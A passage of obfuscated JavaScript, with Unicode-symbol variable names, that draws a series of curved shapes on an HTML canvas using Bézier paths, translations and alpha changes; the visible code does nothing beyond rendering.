				Δ.bezierCurveTo(95.14285278320312 * ᐃ, ᐃ * 389.5892868041992, 97.14285278320312 * ᐃ, ᐃ * 393.5892868041992, ᐃ * 107.14285278320312, 396.5892868041992 * ᐃ);
				Δ.bezierCurveTo(114.14285278320312 * ᐃ, 396.5892868041992 * ᐃ, 118.14285278320312 * ᐃ, ᐃ * 393.5892868041992, 116.14285278320312 * ᐃ, 391.5892868041992 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = ΔⵠⲆΔ;
				Δ.translate(ᐃ * -ⵠⲆΔⵠΔ, -3 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 117.14285278320312, ᐃ * 392.5892868041992);
				Δ.bezierCurveTo(115.14285278320312 * ᐃ, ᐃ * 384.5892868041992, ᐃ * 109.14285278320312, ᐃ * 383.5892868041992, ᐃ * 103.14285278320312, ᐃ * 384.5892868041992);
				Δ.bezierCurveTo(95.14285278320312 * ᐃ, 389.5892868041992 * ᐃ, ᐃ * 97.14285278320312, ᐃ * 393.5892868041992, 107.14285278320312 * ᐃ, 396.5892868041992 * ᐃ);
				Δ.bezierCurveTo(114.14285278320312 * ᐃ, 396.5892868041992 * ᐃ, 118.14285278320312 * ᐃ, 393.5892868041992 * ᐃ, 116.14285278320312 * ᐃ, ᐃ * 391.5892868041992);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1]);
				Δ.globalAlpha = .5;
				Δ.translate(3 * ᐃ, Δⵠᐃⵠ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ᐃΔΔΔ];
				Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
				Δ.moveTo(122.14285278320312 * ᐃ, ᐃ * 403.7321472167969);
				Δ.bezierCurveTo(ᐃ * 132.14285278320312, 399.7321472167969 * ᐃ, ᐃ * 133.14285278320312, ᐃ * 418.7321472167969, ᐃ * 129.14285278320312, ᐃ * 419.7321472167969);
				Δ.bezierCurveTo(119.14285278320312 * ᐃ, 420.7321472167969 * ᐃ, 118.14285278320312 * ᐃ, ᐃ * 402.7321472167969, ᐃ * 123.14285278320312, 403.7321472167969 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ⵠᐃⲆᐃ]);
				Δ.globalAlpha = 1;
				Δ.translate(ᐃ * -ᐃᐃⲆⲆ, ᐃ * -ⵠᐃⵠⲆ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ᐃᐃⲆᐃ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(122.14285278320312 * ᐃ, 403.7321472167969 * ᐃ);
				Δ.bezierCurveTo(132.14285278320312 * ᐃ, ᐃ * 399.7321472167969, 133.14285278320312 * ᐃ, ᐃ * 418.7321472167969, 129.14285278320312 * ᐃ, 419.7321472167969 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 119.14285278320312, 420.7321472167969 * ᐃ, 118.14285278320312 * ᐃ, 402.7321472167969 * ᐃ, ᐃ * 123.14285278320312, 403.7321472167969 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ⵠΔᐃ]);
				Δ.globalAlpha = .5;
				Δ.translate(ⲆΔⵠⵠ * ᐃ, 3 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ΔᐃΔⲆ];
				Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
				Δ.moveTo(ᐃ * 317.1428527832031, 417.5892868041992 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 333.1428527832031, ᐃ * 421.5892868041992, ᐃ * 299.1428527832031, 455.5892868041992 * ᐃ, 294.1428527832031 * ᐃ, ᐃ * 438.5892868041992);
				Δ.bezierCurveTo(ᐃ * 289.1428527832031, ᐃ * 423.5892868041992, 307.1428527832031 * ᐃ, ᐃ * 414.5892868041992, 317.1428527832031 * ᐃ, ᐃ * 417.5892868041992);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = 1;
				Δ.translate(-3 * ᐃ, ᐃ * -3);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ᐃΔΔⲆ];
				Δ.lineJoin = ⵠ[ⵠⲆᐃᐃ];
				Δ.moveTo(ᐃ * 317.1428527832031, 417.5892868041992 * ᐃ);
				Δ.bezierCurveTo(333.1428527832031 * ᐃ, ᐃ * 421.5892868041992, 299.1428527832031 * ᐃ, ᐃ * 455.5892868041992, ᐃ * 294.1428527832031, ᐃ * 438.5892868041992);
				Δ.bezierCurveTo(289.1428527832031 * ᐃ, ᐃ * 423.5892868041992, ᐃ * 307.1428527832031, 414.5892868041992 * ᐃ, ᐃ * 317.1428527832031, 417.5892868041992 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1]);
				Δ.globalAlpha = .5;
				Δ.translate(ᐃ * 3, 3 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ΔᐃΔⲆ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(322.1428527832031 * ᐃ, ᐃ * 437.30357360839844);
				Δ.bezierCurveTo(ᐃ * 330.1428527832031, 431.30357360839844 * ᐃ, ᐃ * 336.1428527832031, 440.30357360839844 * ᐃ, 336.1428527832031 * ᐃ, ᐃ * 448.30357360839844);
				Δ.bezierCurveTo(ᐃ * 334.1428527832031, 454.30357360839844 * ᐃ, ᐃ * 316.1428527832031, ᐃ * 447.30357360839844, 323.1428527832031 * ᐃ, 437.30357360839844 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ΔⲆⵠⲆ]);
				Δ.globalAlpha = ⵠΔⵠΔ;
				Δ.translate(-3 * ᐃ, ᐃ * -3);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
				Δ.moveTo(ᐃ * 322.1428527832031, 437.30357360839844 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 330.1428527832031, 431.30357360839844 * ᐃ, ᐃ * 336.1428527832031, ᐃ * 440.30357360839844, 336.1428527832031 * ᐃ, ᐃ * 448.30357360839844);
				Δ.bezierCurveTo(ᐃ * 334.1428527832031, ᐃ * 454.30357360839844, ᐃ * 316.1428527832031, 447.30357360839844 * ᐃ, 323.1428527832031 * ᐃ, ᐃ * 437.30357360839844);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ΔΔᐃⵠ]);
				Δ.globalAlpha = .5;
				Δ.translate(ⵠⵠⵠᐃ * ᐃ, ᐃ * ⲆᐃΔᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
				Δ.moveTo(ᐃ * 438.1428527832031, 358.5892868041992 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 455.1428527832031, 351.5892868041992 * ᐃ, 467.1428527832031 * ᐃ, ᐃ * 371.5892868041992, 455.1428527832031 * ᐃ, 374.5892868041992 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 442.1428527832031, ᐃ * 377.5892868041992, ᐃ * 429.1428527832031, ᐃ * 361.5892868041992, 438.1428527832031 * ᐃ, ᐃ * 358.5892868041992);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠ]);
				Δ.globalAlpha = ⵠᐃⵠΔ;
				Δ.translate(-ΔΔᐃΔ * ᐃ, -ⵠᐃⵠⲆ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 438.1428527832031, 358.5892868041992 * ᐃ);
				Δ.bezierCurveTo(455.1428527832031 * ᐃ, 351.5892868041992 * ᐃ, ᐃ * 467.1428527832031, ᐃ * 371.5892868041992, ᐃ * 455.1428527832031, 374.5892868041992 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 442.1428527832031, 377.5892868041992 * ᐃ, 429.1428527832031 * ᐃ, ᐃ * 361.5892868041992, 438.1428527832031 * ᐃ, 358.5892868041992 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1]);
				Δ.globalAlpha = .5;
				Δ.translate(3 * ᐃ, ᐃ * 3);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠⵠΔΔ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(423.1428527832031 * ᐃ, 363.16071701049805 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 433.1428527832031, 362.16071701049805 * ᐃ, ᐃ * 433.1428527832031, ᐃ * 374.16071701049805, 421.1428527832031 * ᐃ, 382.16071701049805 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 413.1428527832031, 383.16071701049805 * ᐃ, 413.1428527832031 * ᐃ, ᐃ * 368.16071701049805, ᐃ * 423.1428527832031, ᐃ * 363.16071701049805);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = ΔᐃᐃⲆ;
				Δ.translate(-ⵠⵠⵠⵠ * ᐃ, ᐃ * -ᐃⵠⲆΔᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ΔΔᐃⲆ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(423.1428527832031 * ᐃ, ᐃ * 363.16071701049805);
				Δ.bezierCurveTo(ᐃ * 433.1428527832031, ᐃ * 362.16071701049805, ᐃ * 433.1428527832031, 374.16071701049805 * ᐃ, 421.1428527832031 * ᐃ, ᐃ * 382.16071701049805);
				Δ.bezierCurveTo(ᐃ * 413.1428527832031, ᐃ * 383.16071701049805, ᐃ * 413.1428527832031, 368.16071701049805 * ᐃ, 423.1428527832031 * ᐃ, 363.16071701049805 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ᐃΔᐃⲆ]);
				Δ.globalAlpha = .5;
				Δ.translate(3 * ᐃ, ᐃ * 3);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ΔⵠⲆⲆ];
				Δ.lineJoin = ⵠ[ⵠⵠΔΔ];
				Δ.moveTo(431.1428527832031 * ᐃ, 333.0178565979004 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 447.1428527832031, ᐃ * 330.0178565979004, 448.1428527832031 * ᐃ, 340.0178565979004 * ᐃ, ᐃ * 447.1428527832031, 343.0178565979004 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 445.1428527832031, 351.0178565979004 * ᐃ, ᐃ * 415.1428527832031, ᐃ * 343.0178565979004, ᐃ * 431.1428527832031, ᐃ * 333.0178565979004);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = ⵠΔΔ;
				Δ.translate(-3 * ᐃ, -3 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
				Δ.moveTo(ᐃ * 431.1428527832031, ᐃ * 333.0178565979004);
				Δ.bezierCurveTo(447.1428527832031 * ᐃ, 330.0178565979004 * ᐃ, 448.1428527832031 * ᐃ, 340.0178565979004 * ᐃ, ᐃ * 447.1428527832031, ᐃ * 343.0178565979004);
				Δ.bezierCurveTo(445.1428527832031 * ᐃ, ᐃ * 351.0178565979004, ᐃ * 415.1428527832031, ᐃ * 343.0178565979004, 431.1428527832031 * ᐃ, 333.0178565979004 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ⲆⵠⲆⲆ]);
				Δ.globalAlpha = .5;
				Δ.translate(3 * ᐃ, ᐃ * 3);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠᐃΔⲆ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(486.1428527832031 * ᐃ, ᐃ * 272.44642639160156);
				Δ.bezierCurveTo(493.1428527832031 * ᐃ, 260.44642639160156 * ᐃ, 519.1428527832031 * ᐃ, 277.44642639160156 * ᐃ, 511.1428527832031 * ᐃ, 289.44642639160156 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 503.1428527832031, 297.44642639160156 * ᐃ, ᐃ * 483.1428527832031, 277.44642639160156 * ᐃ, 486.1428527832031 * ᐃ, 273.44642639160156 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆ]);
				Δ.globalAlpha = ⲆⵠⲆⲆ;
				Δ.translate(ᐃ * -3, ᐃ * -ΔΔᐃΔ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(486.1428527832031 * ᐃ, 272.44642639160156 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 493.1428527832031, 260.44642639160156 * ᐃ, 519.1428527832031 * ᐃ, 277.44642639160156 * ᐃ, 511.1428527832031 * ᐃ, ᐃ * 289.44642639160156);
				Δ.bezierCurveTo(503.1428527832031 * ᐃ, ᐃ * 297.44642639160156, ᐃ * 483.1428527832031, 277.44642639160156 * ᐃ, ᐃ * 486.1428527832031, ᐃ * 273.44642639160156);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1]);
				Δ.globalAlpha = .5;
				Δ.translate(ⲆⲆΔⲆ * ᐃ, ᐃ * ⲆᐃΔᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
				Δ.moveTo(503.1428527832031 * ᐃ, 245.01785278320312 * ᐃ);
				Δ.bezierCurveTo(516.1428527832031 * ᐃ, 247.01785278320312 * ᐃ, 513.1428527832031 * ᐃ, ᐃ * 264.0178527832031, 509.1428527832031 * ᐃ, 265.0178527832031 * ᐃ);
				Δ.bezierCurveTo(499.1428527832031 * ᐃ, 268.0178527832031 * ᐃ, 494.1428527832031 * ᐃ, 244.01785278320312 * ᐃ, ᐃ * 504.1428527832031, 245.01785278320312 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = Ⲇᐃⵠ;
				Δ.translate(ᐃ * -3, ᐃ * -3);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ⵠⲆᐃᐃ];
				Δ.moveTo(503.1428527832031 * ᐃ, ᐃ * 245.01785278320312);
				Δ.bezierCurveTo(ᐃ * 516.1428527832031, ᐃ * 247.01785278320312, 513.1428527832031 * ᐃ, ᐃ * 264.0178527832031, 509.1428527832031 * ᐃ, ᐃ * 265.0178527832031);
				Δ.bezierCurveTo(499.1428527832031 * ᐃ, 268.0178527832031 * ᐃ, 494.1428527832031 * ᐃ, 244.01785278320312 * ᐃ, 504.1428527832031 * ᐃ, 245.01785278320312 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ΔⲆⵠ]);
				Δ.globalAlpha = .5;
				Δ.translate(3 * ᐃ, ⵠⵠⵠⵠ * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
				Δ.moveTo(518.1428527832031 * ᐃ, ᐃ * 179.73213958740234);
				Δ.bezierCurveTo(529.1428527832031 * ᐃ, 181.73213958740234 * ᐃ, ᐃ * 514.1428527832031, 212.73213958740234 * ᐃ, ᐃ * 505.1428527832031, ᐃ * 200.73213958740234);
				Δ.bezierCurveTo(ᐃ * 499.1428527832031, 186.73213958740234 * ᐃ, 515.1428527832031 * ᐃ, ᐃ * 177.73213958740234, 518.1428527832031 * ᐃ, ᐃ * 179.73213958740234);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠ]);
				Δ.globalAlpha = 1;
				Δ.translate(-Δⵠᐃⵠ * ᐃ, ᐃ * -ΔⲆΔᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 518.1428527832031, 179.73213958740234 * ᐃ);
				Δ.bezierCurveTo(529.1428527832031 * ᐃ, ᐃ * 181.73213958740234, 514.1428527832031 * ᐃ, ᐃ * 212.73213958740234, 505.1428527832031 * ᐃ, 200.73213958740234 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 499.1428527832031, ᐃ * 186.73213958740234, 515.1428527832031 * ᐃ, 177.73213958740234 * ᐃ, ᐃ * 518.1428527832031, 179.73213958740234 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆΔ]);
				Δ.globalAlpha = .5;
				Δ.translate(ᐃ * ΔⲆᐃⲆ, 3 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
				Δ.moveTo(ᐃ * 438.1428527832031, ᐃ * 22.16070556640625);
				Δ.bezierCurveTo(446.1428527832031 * ᐃ, 27.16070556640625 * ᐃ, 422.1428527832031 * ᐃ, ᐃ * 54.16070556640625, ᐃ * 414.1428527832031, 40.16070556640625 * ᐃ);
				Δ.bezierCurveTo(409.1428527832031 * ᐃ, ᐃ * 27.16070556640625, 430.1428527832031 * ᐃ, 15.16070556640625 * ᐃ, 438.1428527832031 * ᐃ, 22.16070556640625 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = ᐃⲆᐃ;
				Δ.translate(-3 * ᐃ, ᐃ * -3);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 438.1428527832031, 22.16070556640625 * ᐃ);
				Δ.bezierCurveTo(446.1428527832031 * ᐃ, ᐃ * 27.16070556640625, 422.1428527832031 * ᐃ, ᐃ * 54.16070556640625, ᐃ * 414.1428527832031, ᐃ * 40.16070556640625);
				Δ.bezierCurveTo(ᐃ * 409.1428527832031, 27.16070556640625 * ᐃ, ᐃ * 430.1428527832031, 15.16070556640625 * ᐃ, ᐃ * 438.1428527832031, ᐃ * 22.16070556640625);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[ⵠΔⵠΔ]);
				Δ.globalAlpha = .5;
				Δ.translate(3 * ᐃ, 3 * ᐃ);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ᐃᐃⲆᐃ];
				Δ.lineJoin = ⵠ[ⵠᐃⲆΔ];
				Δ.moveTo(406.1428527832031 * ᐃ, ᐃ * 11.16070556640625);
				Δ.bezierCurveTo(418.1428527832031 * ᐃ, 14.16070556640625 * ᐃ, ᐃ * 411.1428527832031, 27.16070556640625 * ᐃ, 403.1428527832031 * ᐃ, ᐃ * 30.16070556640625);
				Δ.bezierCurveTo(ᐃ * 395.1428527832031, 31.16070556640625 * ᐃ, 391.1428527832031 * ᐃ, ᐃ * 16.16070556640625, ᐃ * 406.1428527832031, 10.16070556640625 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0]);
				Δ.globalAlpha = ΔᐃⲆⵠ;
				Δ.translate(ᐃ * -ᐃⲆᐃᐃ, ᐃ * -3);
				Δ.beginPath();
				Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
				Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
				Δ.moveTo(406.1428527832031 * ᐃ, ᐃ * 11.16070556640625);
				Δ.bezierCurveTo(ᐃ * 418.1428527832031, 14.16070556640625 * ᐃ, 411.1428527832031 * ᐃ, ᐃ * 27.16070556640625, 403.1428527832031 * ᐃ, 30.16070556640625 * ᐃ);
				Δ.bezierCurveTo(395.1428527832031 * ᐃ, 31.16070556640625 * ᐃ, 391.1428527832031 * ᐃ, ᐃ * 16.16070556640625, 406.1428527832031 * ᐃ, 10.16070556640625 * ᐃ);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[1]);
				Δ.translate(ᐃ * 100, 100 * ᐃ)
			}
			Δ.globalAlpha = 1;
			Δ.translate(ᐃ * -ΔᐃⲆΔ, ᐃ * -ᐃᐃⵠⲆᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔΔᐃⲆ];
			Δ.lineJoin = ⵠ[ⵠⵠΔΔ];
			Δ.moveTo(271 * ᐃ, ᐃ * 111);
			Δ.bezierCurveTo(ᐃ * 259, ᐃ * 110, 258 * ᐃ, ᐃ * 99, ᐃ * 265, ᐃ * 95);
			Δ.bezierCurveTo(276 * ᐃ, 91 * ᐃ, 279 * ᐃ, 100 * ᐃ, 275 * ᐃ, ᐃ * 107);
			Δ.bezierCurveTo(274 * ᐃ, 109 * ᐃ, 273 * ᐃ, ᐃ * 110, 271 * ᐃ, 111 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[3], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(169 * ᐃ, ᐃ * 121);
			Δ.bezierCurveTo(159 * ᐃ, ᐃ * 129, ᐃ * 149, ᐃ * 126, 144 * ᐃ, ᐃ * 114);
			Δ.bezierCurveTo(142 * ᐃ, 102 * ᐃ, ᐃ * 149, ᐃ * 98, 163 * ᐃ, ᐃ * 96);
			Δ.bezierCurveTo(175 * ᐃ, ᐃ * 98, ᐃ * 176, 115 * ᐃ, ᐃ * 169, ᐃ * 121);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆΔᐃ], Ⲇᐃ[ΔΔᐃΔ], ᐃ * ᐃⲆⵠᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠᐃⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(213 * ᐃ, 150 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 206, 134 * ᐃ, 216 * ᐃ, 120 * ᐃ, ᐃ * 235, 129 * ᐃ);
			Δ.bezierCurveTo(247 * ᐃ, 139 * ᐃ, ᐃ * 242, ᐃ * 146, ᐃ * 237, ᐃ * 154);
			Δ.bezierCurveTo(ᐃ * 226, 162 * ᐃ, ᐃ * 218, ᐃ * 159, 213 * ᐃ, ᐃ * 150);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃᐃⵠ], Ⲇᐃ[3], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ⵠⵠΔΔ];
			Δ.moveTo(236 * ᐃ, ᐃ * 169);
			Δ.bezierCurveTo(ᐃ * 247, 166 * ᐃ, ᐃ * 250, ᐃ * 172, ᐃ * 247, ᐃ * 181);
			Δ.bezierCurveTo(242 * ᐃ, ᐃ * 186, 241 * ᐃ, ᐃ * 181, ᐃ * 242, 182 * ᐃ);
			Δ.bezierCurveTo(241 * ᐃ, 178 * ᐃ, ᐃ * 240, ᐃ * 179, 239 * ᐃ, 181 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 240, ᐃ * 184, 237 * ᐃ, 186 * ᐃ, 233 * ᐃ, 181 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 230, 173 * ᐃ, 233 * ᐃ, 169 * ᐃ, 236 * ᐃ, ᐃ * 169);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Δᐃⵠⵠ], Ⲇᐃ[3], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
			Δ.lineJoin = ⵠ[ⵠᐃΔⲆ];
			Δ.moveTo(ᐃ * 163, ᐃ * 170);
			Δ.bezierCurveTo(ᐃ * 176, 165 * ᐃ, 180 * ᐃ, ᐃ * 172, ᐃ * 181, ᐃ * 181);
			Δ.bezierCurveTo(ᐃ * 182, 189 * ᐃ, ᐃ * 178, ᐃ * 192, ᐃ * 174, ᐃ * 188);
			Δ.bezierCurveTo(ᐃ * 172, 183 * ᐃ, 170 * ᐃ, ᐃ * 184, ᐃ * 170, 188 * ᐃ);
			Δ.bezierCurveTo(176 * ᐃ, ᐃ * 194, ᐃ * 165, 196 * ᐃ, ᐃ * 162, 190 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 152, 181 * ᐃ, ᐃ * 157, 173 * ᐃ, 163 * ᐃ, ᐃ * 170);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[ᐃᐃⲆⲆ], ᐃ * ᐃⲆΔⲆ);
			Δ.scale(.05, .05);
			Δ.translate(5e3 * ᐃ, 1900 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
			Δ.moveTo(ᐃ * 273, ᐃ * 46.546875);
			Δ.bezierCurveTo(ᐃ * 353, 131.546875 * ᐃ, 303 * ᐃ, 213.546875 * ᐃ, ᐃ * 272, ᐃ * 236.546875);
			Δ.bezierCurveTo(ᐃ * 203, 179.546875 * ᐃ, ᐃ * 236, 84.546875 * ᐃ, 273 * ᐃ, 47.546875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[5], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 467, ᐃ * 257.546875);
			Δ.bezierCurveTo(ᐃ * 369, ᐃ * 194.546875, 325 * ᐃ, 236.546875 * ᐃ, ᐃ * 291, 271.546875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 371, 335.546875 * ᐃ, 427 * ᐃ, 313.546875 * ᐃ, 467 * ᐃ, ᐃ * 258.546875);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠΔᐃΔ], Ⲇᐃ[5], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔⲆΔΔ];
			Δ.moveTo(269 * ᐃ, 275.546875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 343, ᐃ * 356.546875, 355 * ᐃ, ᐃ * 407.546875, 323 * ᐃ, 472.546875 * ᐃ);
			Δ.bezierCurveTo(224 * ᐃ, 451.546875 * ᐃ, 238 * ᐃ, 326.546875 * ᐃ, ᐃ * 270, 275.546875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[ⵠⵠΔⵠ], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃΔΔΔ];
			Δ.moveTo(ᐃ * 260, ᐃ * 267.546875);
			Δ.bezierCurveTo(134 * ᐃ, 221.546875 * ᐃ, 89 * ᐃ, 256.546875 * ᐃ, ᐃ * 60, ᐃ * 295.546875);
			Δ.bezierCurveTo(ᐃ * 116, 357.546875 * ᐃ, ᐃ * 242, 344.546875 * ᐃ, 260 * ᐃ, 267.546875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔΔᐃΔ], Ⲇᐃ[ⵠⲆᐃᐃ], ᐃ * 2);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆⵠⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 124, ᐃ * 123.546875);
			Δ.bezierCurveTo(ᐃ * ⵠᐃⲆᐃᐃⵠᐃ, 140.546875 * ᐃ, ᐃ * 265, 234.546875 * ᐃ, ᐃ * 267, 269.546875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 159, 283.546875 * ᐃ, ᐃ * 127, ᐃ * 192.546875, 124 * ᐃ, 124.546875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆⵠΔ], Ⲇᐃ[ᐃⲆⲆᐃᐃ], ⲆⵠΔΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 267, ᐃ * 268.546875);
			Δ.bezierCurveTo(ᐃ * 265, 170.546875 * ᐃ, 364 * ᐃ, 127.546875 * ᐃ, 407 * ᐃ, ᐃ * 132.546875);
			Δ.bezierCurveTo(427 * ᐃ, 204.546875 * ᐃ, 341 * ᐃ, 277.546875 * ᐃ, 268 * ᐃ, 271.546875 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[6], Ⲇᐃ[7], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃΔⵠ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(270 * ᐃ, 269.546875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 370, ᐃ * 251.546875, 410 * ᐃ, 328.546875 * ᐃ, ᐃ * 420, 399.546875 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 292, 412.546875 * ᐃ, ᐃ * 275, ᐃ * 313.546875, 269 * ᐃ, ᐃ * 272.546875);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[6], Ⲇᐃ[ᐃⲆΔΔΔᐃᐃ], 2 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
			Δ.moveTo(273 * ᐃ, ᐃ * 266.546875);
			Δ.bezierCurveTo(ᐃ * 291, 370.546875 * ᐃ, 235 * ᐃ, ᐃ * 428.546875, ᐃ * 173, ᐃ * 451.546875);
			Δ.bezierCurveTo(ᐃ * 124, ᐃ * 365.546875, 217 * ᐃ, ᐃ * 274.546875, 272 * ᐃ, ᐃ * 265.546875);
			Δ.closePath();
